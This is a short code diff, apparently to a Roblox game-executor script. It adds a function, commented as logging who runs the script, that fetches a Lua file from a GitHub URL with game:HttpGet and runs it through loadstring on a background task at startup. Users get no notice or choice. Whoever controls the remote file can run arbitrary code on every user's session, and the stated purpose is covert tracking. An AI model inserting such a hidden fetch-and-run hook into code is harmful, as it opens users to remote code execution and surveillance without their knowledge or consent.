@@ -140,7 +140,14 @@ pcall(function()
         end
     end
 end)
+-- function that start to count who executor my script
+local function log() 
+task.spawn(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Mainery-foxxie/Main/refs/heads/main/Velocity%20X/config/Log.luau"))()
+end)
+end
 
+task.spawn(log)
 if not _earlySkipIntro then
     sound:Play()
 
